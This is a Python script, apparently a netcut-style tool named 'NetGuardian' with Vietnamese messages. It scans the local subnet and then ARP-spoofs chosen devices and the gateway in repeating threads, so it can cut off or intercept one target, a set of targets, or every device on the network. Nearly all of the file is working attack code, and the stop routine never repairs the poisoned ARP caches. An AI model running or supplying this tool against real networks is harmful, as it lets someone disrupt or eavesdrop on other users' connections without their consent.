import concurrent.futures
import socket
import threading
import time

from scapy.all import conf, send, srp
from scapy.layers.l2 import ARP, Ether
from tabulate import tabulate

conf.use_pcap = True


class NetGuardian:
    def __init__(self):
        self.target_ips = set()
        self.gateway_ip = None
        self.is_cutting = False
        self.control_thread = None
        self.devices = []
        self.lock = threading.Lock()

    def get_network_info(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()

            gateway_ip = conf.route.route("0.0.0.0")[2]

            network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'

            return {
                'gateway': gateway_ip,
                'local_ip': local_ip,
                'network': network
            }
        except Exception as e:
            print(f"[!] Lỗi khi lấy thông tin mạng: {e}")
            return None

    def get_mac(self, ip):
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)

            ans, _ = srp(arp_request, timeout=1, verbose=False, retry=1)

            if ans and len(ans) > 0:
                return ans[0][1][ARP].hwsrc
            return None

        except Exception as e:
            print(f"[!] Lỗi khi lấy MAC của {ip}: {e}")
            return None

    def scan_ip(self, ip):
        try:
            if ip == self.get_network_info()['local_ip']:
                return

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex((ip, 135))

                if result == 0:
                    mac = self.get_mac(ip)
                    if mac:
                        with self.lock:
                            self.devices.append({
                                'ip': ip,
                                'mac': mac,
                                'hostname': self.get_hostname(ip),
                                'status': 'Hoạt động'
                            })

        except socket.error:
            pass
        except Exception as e:
            print(f"[!] Lỗi khi quét IP {ip}: {e}")

    def scan_network(self):
        net_info = self.get_network_info()
        if not net_info:
            return []

        print(f"\n[*] Đang quét mạng {net_info['network']}...")
        start_time = time.time()

        self.devices = []
        ip_parts = net_info['local_ip'].split('.')

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for i in range(1, 255):
                ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
                futures.append(executor.submit(self.scan_ip, ip))

            concurrent.futures.wait(futures)

        scan_time = time.time() - start_time
        print(f"\n[+] Quét hoàn tất! ({scan_time:.2f}s)")
        return self.devices

    def get_hostname(self, ip):
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except (socket.herror, socket.gaierror):
            return "Unknown"

    def display_results(self):
        headers = ["STT", "IP", "MAC", "Hostname", "Status"]
        table_data = []
        for idx, device in enumerate(self.devices, 1):
            table_data.append([
                idx,
                device['ip'],
                device['mac'],
                device['hostname'],
                device['status']
            ])
        print("\nKết quả quét mạng:")
        print(tabulate(table_data, headers=headers, tablefmt="grid"))
        return table_data

    def spoof(self, target_ip, spoof_ip):
        try:
            target_mac = self.get_mac(target_ip)
            if target_mac:
                arp_response = Ether(dst=target_mac)/ARP(
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoof_ip,
                    hwsrc=conf.iface.mac,
                    op='is-at'
                )
                send(arp_response, verbose=False)
                return True
            return False
        except Exception as e:
            print(f"[!] Lỗi khi spoofing {target_ip}: {e}")
            return False

    def start_control(self, target_ip):
        net_info = self.get_network_info()
        if not net_info:
            print("[!] Không thể lấy thông tin mạng")
            return False

        self.target_ip = target_ip
        self.gateway_ip = net_info['gateway']
        self.is_cutting = True

        def control_thread():
            try:
                print(f"[+] Bắt đầu chặn {target_ip}")
                while self.is_cutting:
                    self.spoof(target_ip, self.gateway_ip)
                    self.spoof(self.gateway_ip, target_ip)
                    time.sleep(2)
            except Exception as e:
                print(f"[!] Lỗi: {e}")
                self.stop_control()

        self.control_thread = threading.Thread(target=control_thread)
        self.control_thread.start()
        return True

    def stop_control(self):
        if self.is_cutting:
            self.is_cutting = False
            print("\n[*] Đang dừng chặn...")
            if self.control_thread:
                self.control_thread.join()
            print("[+] Đã dừng chặn!")

    def start_control_all(self):
        net_info = self.get_network_info()
        if not net_info:
            print("[!] Không thể lấy thông tin mạng")
            return False

        self.gateway_ip = net_info['gateway']
        self.is_cutting = True

        def control_thread():
            try:
                print("[+] Bắt đầu chặn tất cả thiết bị")
                while self.is_cutting:
                    for device in self.devices:
                        target_ip = device['ip']
                        if target_ip != self.gateway_ip and target_ip != net_info['local_ip']:
                            self.spoof(target_ip, self.gateway_ip)
                            self.spoof(self.gateway_ip, target_ip)
                    time.sleep(2)
            except Exception as e:
                print(f"[!] Lỗi: {e}")
                self.stop_control()

        self.control_thread = threading.Thread(target=control_thread)
        self.control_thread.start()
        return True

    def start_control_device(self, target_ip):
        with self.lock:
            self.target_ips.add(target_ip)
            if not self.is_cutting:
                self.start_control_thread()

    def stop_control_device(self, target_ip):
        with self.lock:
            if target_ip in self.target_ips:
                self.target_ips.remove(target_ip)
            if not self.target_ips:
                self.stop_control()

    def start_control_thread(self):
        net_info = self.get_network_info()
        if not net_info:
            return False

        self.gateway_ip = net_info['gateway']
        self.is_cutting = True

        def control_thread():
            try:
                while self.is_cutting:
                    with self.lock:
                        for target_ip in self.target_ips:
                            if target_ip != self.gateway_ip and target_ip != net_info['local_ip']:
                                self.spoof(target_ip, self.gateway_ip)
                                self.spoof(self.gateway_ip, target_ip)
                    time.sleep(2)
            except Exception as e:
                print(f"[!] Lỗi: {e}")
                self.stop_control()

        self.control_thread = threading.Thread(target=control_thread)
        self.control_thread.start()
        return True
